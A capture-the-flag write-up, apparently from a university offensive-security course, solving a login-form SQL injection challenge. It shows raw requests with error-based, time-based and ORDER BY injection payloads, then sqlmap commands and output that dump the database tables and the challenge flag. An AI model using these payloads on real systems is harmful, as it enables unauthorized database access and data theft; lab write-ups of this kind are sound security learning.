200 point SQLi one
This one seems to be easier than the CSP one (based on # of people who've gotten it)

##### First Error! (Confirming with logical operations)
Request:
```
POST /login.php? HTTP/1.1
Host: offsec-chalbroker.osiris.cyber.nyu.edu:1241
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Origin: http://offsec-chalbroker.osiris.cyber.nyu.edu:1241
Connection: close
Referer: http://offsec-chalbroker.osiris.cyber.nyu.edu:1241/login.php?
Cookie: CHALBROKER_USER_ID=lmv9443; PHPSESSID=qfvb0rp4j0g6bfni9vp40tqvr5
Upgrade-Insecure-Requests: 1
X-PwnFox-Color: magenta

email=test'&password=test
```
Response:
```
HTTP/1.1 200 OK
Date: Tue, 09 Apr 2024 21:30:42 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.29
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 161
Connection: close
Content-Type: text/html

<br />
<b>Fatal error</b>:  Call to a member function fetch_assoc() on a non-object in <b>/var/www/example.com/public_html/login.php</b> on line <b>11</b><br />
```

![[Pasted image 20240409164324.png]]

Lol, though now I know how to do [[Log Me In]]

##### Now Confirming with Timing
Request:
```
POST /login.php? HTTP/1.1
Host: offsec-chalbroker.osiris.cyber.nyu.edu:1241
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 66
Origin: http://offsec-chalbroker.osiris.cyber.nyu.edu:1241
Connection: close
Referer: http://offsec-chalbroker.osiris.cyber.nyu.edu:1241/login.php?
Cookie: CHALBROKER_USER_ID=lmv9443; PHPSESSID=rq4tvl5ierd6shrbqdbplkoum3
Upgrade-Insecure-Requests: 1
X-PwnFox-Color: magenta

email=test'%20OR%201=1%20AND%20sleep(50)%20--%20test&password=test
```
Response: *Took 50,836 milliseconds*
```
HTTP/1.1 200 OK
Date: Wed, 10 Apr 2024 01:09:07 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.29
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 2446
Connection: close
Content-Type: text/
           <h3 style="color: red">No such user!</h3>            <label for="inputEmail" class="sr-only">Email address</label>
            <input type="email" id="inputEmail" name="email" class="form-control" placeholder="Email address" required autofocus>
            <label for="inputPassword" class="sr-only">Password</label>
            <input type="password" id="inputPassword" name="password" class="form-control" placeholder="Password" required>
            <br/>
            <button class="btn btn-lg btn-primary btn-block" type="submit">Sign in</button>
```

And one with `sleep(10)` took 10,799 Miliseconds

# Number of Columns
###### Intruder Payload

#### Results:
We start to get an error at n = 4, meaning we have three columns
![[Pasted image 20240409201621.png]]


```
POST /login.php? HTTP/1.1
Host: offsec-chalbroker.osiris.cyber.nyu.edu:1241
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 65
Origin: http://offsec-chalbroker.osiris.cyber.nyu.edu:1241
Connection: close
Referer: http://offsec-chalbroker.osiris.cyber.nyu.edu:1241/login.php?
Cookie: CHALBROKER_USER_ID=lmv9443; PHPSESSID=rq4tvl5ierd6shrbqdbplkoum3
Upgrade-Insecure-Requests: 1
X-PwnFox-Color: magenta

email=test'%20OR%201=1%20ORDER%20BY%20§1§%20--%20test&password=test
```
Intruder payload above


Now will try to dumb DB char by char

```
 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'
%20AND%20SELECT%20SUBSTR(table_name,1,1)%20FROM%20information_schema.tables%20=%20'A'

email=test'%20OR%201=1%20AND%20SELECT%20SUBSTR(table_name,1,1)%20FROM%20information_schema.tables%20=%20'A'%20--%20test&password=test

```



# Finally got SQLMap Working
```
┌──(kali㉿kali)-[~/Desktop/10-Week/LogMeIn-Again]
└─$ sqlmap -r request.txt -p email --delay 10 --dbms=mysql -technique=BTS --answers='optimize=Y'
        ___
       __H__                                                  
 ___ ___["]_____ ___ ___  {1.7.11#stable}          
|_ -| . [(]     | .'| . |                                                    
|___|_  [)]_|_|_|__,|  _|                                          
      |_|V...       |_|   https://sqlmap.org                                                                                           

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:49:10 /2024-04-09/

[21:49:10] [INFO] parsing HTTP request from 'request.txt'
[21:49:10] [INFO] testing connection to the target URL
[21:49:21] [INFO] testing if the target URL content is stable
[21:49:32] [INFO] target URL content is stable
[21:49:43] [WARNING] heuristic (basic) test shows that POST parameter 'email' might not be injectable
[21:49:53] [INFO] testing for SQL injection on POST parameter 'email'
[21:49:53] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[21:51:40] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[21:52:01] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[21:52:01] [WARNING] time-based comparison requires larger statistical model, please wait................ (done)                      
[21:55:49] [INFO] POST parameter 'email' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
[21:56:00] [INFO] checking if the injection point on POST parameter 'email' is a false positive
POST parameter 'email' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 39 HTTP(s) requests:
---
Parameter: email (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=test' AND (SELECT 5834 FROM (SELECT(SLEEP(5)))HWrO) AND 'YhZA'='YhZA&password=test
---
[21:57:48] [INFO] the back-end DBMS is MySQL
[21:57:48] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
web server operating system: Linux Ubuntu
web application technology: PHP 5.5.9, Apache 2.4.7
back-end DBMS: MySQL >= 5.0.12
[21:58:43] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/offsec-chalbroker.osiris.cyber.nyu.edu'

[*] ending @ 21:58:43 /2024-04-09/

```

```
┌──(kali㉿kali)-[~/Desktop/10-Week/LogMeIn-Again]
└─$ sqlmap -r request.txt -p email --delay 10 --dbms=mysql -technique=BTS --answers='optimize=Y' --dbs

[*] starting @ 22:26:35 /2024-04-09/

[22:26:35] [INFO] parsing HTTP request from 'request.txt'
[22:26:35] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: email (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=test' AND (SELECT 5834 FROM (SELECT(SLEEP(5)))HWrO) AND 'YhZA'='YhZA&password=test
---
[22:26:52] [INFO] testing MySQL

do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[22:32:40] [INFO] confirming MySQL
[22:32:40] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
[22:33:23] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS: MySQL >= 5.0.0
[22:33:23] [INFO] fetching database names
[22:33:23] [INFO] fetching number of databases
[22:33:23] [INFO] retrieved: 2
[22:35:03] [INFO] retrieved: information_sch
[23:00:10] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
ema
[23:05:15] [INFO] retrieved: logmein
available databases [2]:
[*] information_schema
[*] logmein

```

```
┌──(kali㉿kali)-[~/Desktop/10-Week/LogMeIn-Again]
└─$ sqlmap -r request.txt -p email --delay 10 --dbms=mysql -technique=BTS --answers='optimize=Y' --dump -D logmein

[*] starting @ 23:19:17 /2024-04-09/

[23:19:17] [INFO] parsing HTTP request from 'request.txt'
[23:19:18] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: email (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=test' AND (SELECT 5834 FROM (SELECT(SLEEP(5)))HWrO) AND 'YhZA'='YhZA&password=test
---
[23:19:28] [INFO] testing MySQL
[23:19:28] [INFO] confirming MySQL
[23:19:28] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: PHP 5.5.9, Apache 2.4.7
back-end DBMS: MySQL >= 5.0.0
[23:19:28] [INFO] fetching tables for database: 'logmein'
[23:19:28] [INFO] fetching number of tables for database 'logmein'
[23:19:28] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)        
[23:25:03] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
2
[23:26:33] [INFO] retrieved: secrets
[23:37:44] [INFO] retrieved: users    
[23:46:08] [INFO] fetching columns for table 'users' in database 'logmein'
[23:46:08] [INFO] retrieved: 3
[23:48:02] [INFO] retrieved: id
[23:51:47] [INFO] retrieved: email
[00:00:08] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
[00:01:43] [ERROR] invalid character detected. retrying..
[00:01:43] [WARNING] increasing time delay to 6 seconds

[00:02:16] [INFO] retrieved: password
[00:15:56] [INFO] fetching entries for table 'users' in database 'logmein'
[00:15:56] [INFO] fetching number of entries for table 'users' in database 'logmein'
[00:15:56] [INFO] retrieved: ^Z
zsh: suspended  sqlmap -r request.txt -p email --delay 10 --dbms=mysql -technique=BTS  --dump

```


# Yay I Win
```
┌──(kali㉿kali)-[~/Desktop/10-Week/LogMeIn-Again]
└─$ sqlmap -r request.txt -p email --delay 10 --dbms=mysql -technique=BTS --answers='optimize=Y' --dump -D logmein -T secrets
        ___
       __H__                                                                                                                           
 ___ ___[,]_____ ___ ___  {1.7.11#stable}                                                                                              
|_ -| . ["]     | .'| . |                                                                                                              
|___|_  [']_|_|_|__,|  _|                                                                                                              
      |_|V...       |_|   https://sqlmap.org                                                                                           

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 00:16:30 /2024-04-10/

[00:16:30] [INFO] parsing HTTP request from 'request.txt'
[00:16:30] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: email (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=test' AND (SELECT 5834 FROM (SELECT(SLEEP(5)))HWrO) AND 'YhZA'='YhZA&password=test
---
[00:16:41] [INFO] testing MySQL
[00:16:41] [INFO] confirming MySQL
[00:16:41] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: PHP 5.5.9, Apache 2.4.7
back-end DBMS: MySQL >= 5.0.0
[00:16:41] [INFO] fetching columns for table 'secrets' in database 'logmein'
[00:16:41] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)        
[00:22:22] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
2
[00:23:50] [INFO] retrieved: id
[00:27:34] [INFO] retrieved: value
[00:35:49] [INFO] fetching entries for table 'secrets' in database 'logmein'
[00:35:49] [INFO] fetching number of entries for table 'secrets' in database 'logmein'
[00:35:49] [INFO] retrieved: 1
[00:37:09] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)
flag{1_r3a
[01:00:13] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
[01:00:59] [ERROR] invalid character detected. retrying..
[01:00:59] [WARNING] increasing time delay to 6 seconds
lly_d0nt_have_a_g00d_id3a_for_a
[02:00:02] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
_flag}
[02:09:14] [INFO] retrieved: ^Z
zsh: suspended  sqlmap -r request.txt -p email --delay 10 --dbms=mysql -technique=BTS  --dump

```